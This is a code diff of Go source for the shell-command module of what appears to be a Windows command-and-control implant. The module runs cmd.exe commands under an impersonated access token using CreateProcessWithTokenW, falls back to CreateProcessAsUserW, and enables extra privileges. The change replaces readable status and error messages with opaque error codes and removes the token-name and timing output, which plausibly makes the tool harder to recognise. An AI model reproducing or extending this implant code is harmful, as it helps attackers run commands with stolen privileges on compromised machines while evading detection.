@@ -42,7 +42,7 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		case "--timeout":
 			if i+1 >= len(args) {
 				return CommandResult{
-					Output:      "Error: --timeout requires a value",
+					Output:      Err(E20),
 					ExitCode:    1,
 					CompletedAt: time.Now().Format(time.RFC3339),
 				}
@@ -51,7 +51,7 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 			timeoutSeconds, err := strconv.Atoi(args[i+1])
 			if err != nil || timeoutSeconds <= 0 {
 				return CommandResult{
-					Output:      fmt.Sprintf("Error: Invalid timeout value '%s'", args[i+1]),
+					Output:      ErrCtx(E22, args[i+1]),
 					ExitCode:    1,
 					CompletedAt: time.Now().Format(time.RFC3339),
 				}
@@ -67,7 +67,7 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	if len(commandArgs) == 0 {
 		return CommandResult{
-			Output:      "Error: No command specified after flags",
+			Output:      Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -93,31 +93,20 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	workingDir := ctx.WorkingDir
 	ctx.mu.RUnlock()
 
-	// Build output header
 	var output strings.Builder
-	output.WriteString(fmt.Sprintf("[*] Executing: %s\n", strings.Join(args, " "))) // Show original command
-	output.WriteString(fmt.Sprintf("[*] Working Directory: %s\n", workingDir))
-	output.WriteString(fmt.Sprintf("[*] Timeout: %v\n", timeout))
 
 	// Check if we have an active token
-	hasToken, tokenName := CheckTokenContext(ctx)
+	hasToken, _ := CheckTokenContext(ctx)
 
 	if hasToken {
-		output.WriteString(fmt.Sprintf("[*] Using Token: %s\n", tokenName))
-		// Get the token for process creation
 		token, gotToken := GetTokenForExecution(ctx)
 		if gotToken {
 			defer CleanupToken(token)
-			output.WriteString(strings.Repeat("-", 50) + "\n")
-			return c.executeWithToken(commandStr, workingDir, timeout, &output, token) // CHANGED: Pass by pointer
-		} else {
-			output.WriteString("[!] Failed to get token for execution, falling back to normal execution\n")
+			return c.executeWithToken(commandStr, workingDir, timeout, &output, token)
 		}
 	}
 
-	output.WriteString("[*] Shell: cmd.exe (no impersonation)\n")
-	output.WriteString(strings.Repeat("-", 50) + "\n")
-	return c.executeNormal(commandStr, workingDir, timeout, &output) // CHANGED: Pass by pointer
+	return c.executeNormal(commandStr, workingDir, timeout, &output)
 }
 
 // executeWithToken executes a command using the provided token
@@ -129,9 +118,8 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 	cmdLine := fmt.Sprintf("cmd.exe /c %s", commandStr)
 	cmdLineUTF16, err := syscall.UTF16PtrFromString(cmdLine)
 	if err != nil {
-		output.WriteString(fmt.Sprintf("[!] Failed to convert command: %v\n", err))
 		return CommandResult{
-			Output:      output.String(),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -142,9 +130,8 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 	if workingDir != "" {
 		workDirPtr, err = syscall.UTF16PtrFromString(workingDir)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[!] Failed to convert working directory: %v\n", err))
 			return CommandResult{
-				Output:      output.String(),
+				Output:      Err(E19),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -160,9 +147,8 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 
 	err = syscall.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0)
 	if err != nil {
-		output.WriteString(fmt.Sprintf("[!] Failed to create stdout pipe: %v\n", err))
 		return CommandResult{
-			Output:      output.String(),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -172,9 +158,8 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 
 	err = syscall.CreatePipe(&stderrRead, &stderrWrite, &sa, 0)
 	if err != nil {
-		output.WriteString(fmt.Sprintf("[!] Failed to create stderr pipe: %v\n", err))
 		return CommandResult{
-			Output:      output.String(),
+			Output:      Err(E19),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -194,8 +179,7 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 	var pi PROCESS_INFORMATION
 
 	// Try CreateProcessWithTokenW first (requires less privileges)
-	startTime := time.Now()
-	ret, _, lastErr := procCreateProcessWithTokenW.Call(
+	ret, _, _ := procCreateProcessWithTokenW.Call(
 		uintptr(token),
 		0, // dwLogonFlags (0 = default)
 		0, // lpApplicationName (null = use command line)
@@ -209,14 +193,10 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 
 	if ret == 0 {
 		// If CreateProcessWithTokenW fails, try CreateProcessAsUserW as fallback
-		output.WriteString(fmt.Sprintf("[!] CreateProcessWithTokenW failed: %v\n", lastErr))
-		output.WriteString("[*] Attempting CreateProcessAsUserW as fallback...\n")
-
-		// Try to enable additional privileges for CreateProcessAsUser
 		EnablePrivilege("SeAssignPrimaryTokenPrivilege")
 		EnablePrivilege("SeIncreaseQuotaPrivilege")
 
-		ret, _, lastErr = procCreateProcessAsUserW.Call(
+		ret, _, _ = procCreateProcessAsUserW.Call(
 			uintptr(token),
 			0, // lpApplicationName (null = use command line)
 			uintptr(unsafe.Pointer(cmdLineUTF16)),
@@ -231,10 +211,8 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 		)
 
 		if ret == 0 {
-			output.WriteString(fmt.Sprintf("[!] CreateProcessAsUserW also failed: %v\n", lastErr))
-			output.WriteString("[!] Unable to execute with token\n")
 			return CommandResult{
-				Output:      output.String(),
+				Output:      Err(E43),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -253,7 +231,6 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 
 	// Wait for process to complete or timeout
 	event, _ := WaitForSingleObject(pi.Process, timeoutMs)
-	executionTime := time.Since(startTime)
 
 	// Read output from pipes
 	stdoutBuf := make([]byte, 4096)
@@ -287,22 +264,16 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 		if len(stdoutData) > 0 {
 			output.WriteString("\n")
 		}
-		output.WriteString("[STDERR]\n")
 		output.WriteString(string(stderrData))
 	}
-
-	// Add execution time
-	output.WriteString(fmt.Sprintf("\n%s\n", strings.Repeat("-", 50)))
-	output.WriteString(fmt.Sprintf("[*] Execution time: %v\n", executionTime.Round(time.Millisecond)))
 
 	// Handle timeout
 	if event == syscall.WAIT_TIMEOUT {
 		TerminateProcess(pi.Process, 124)
-		output.WriteString(fmt.Sprintf("[!] Command timed out after %v\n", timeout))
 		CloseHandle(pi.Process)
 		CloseHandle(pi.Thread)
 		return CommandResult{
-			Output:      output.String(),
+			Output:      Err(E9),
 			ExitCode:    124,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -315,10 +286,6 @@ func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, ti
 	// Clean up handles
 	CloseHandle(pi.Process)
 	CloseHandle(pi.Thread)
-
-	if exitCode != 0 {
-		output.WriteString(fmt.Sprintf("[!] Command exited with code: %d\n", exitCode))
-	}
 
 	return CommandResult{
 		Output:      output.String(),
@@ -351,9 +318,7 @@ func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeo
 	cmd.Stderr = &stderr
 
 	// Execute the command
-	startTime := time.Now()
 	err := cmd.Run()
-	executionTime := time.Since(startTime)
 
 	// Add stdout to output
 	if stdout.Len() > 0 {
@@ -365,21 +330,15 @@ func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeo
 		if stdout.Len() > 0 {
 			output.WriteString("\n")
 		}
-		output.WriteString("[STDERR]\n")
 		output.WriteString(stderr.String())
 	}
-
-	// Add execution time
-	output.WriteString(fmt.Sprintf("\n%s\n", strings.Repeat("-", 50)))
-	output.WriteString(fmt.Sprintf("[*] Execution time: %v\n", executionTime.Round(time.Millisecond)))
 
 	// Handle errors
 	if err != nil {
 		// Check if it was a timeout
 		if execContext.Err() == context.DeadlineExceeded {
-			output.WriteString(fmt.Sprintf("[!] Command timed out after %v\n", timeout))
 			return CommandResult{
-				Output:      output.String(),
+				Output:      Err(E9),
 				ExitCode:    124,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}
@@ -389,13 +348,6 @@ func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeo
 		exitCode := 1
 		if exitErr, ok := err.(*exec.ExitError); ok {
 			exitCode = exitErr.ExitCode()
-		}
-
-		// Add error info if no output was captured
-		if stdout.Len() == 0 && stderr.Len() == 0 {
-			output.WriteString(fmt.Sprintf("[!] Command failed: %v\n", err))
-		} else {
-			output.WriteString(fmt.Sprintf("[!] Command exited with code: %d\n", exitCode))
 		}
 
 		return CommandResult{
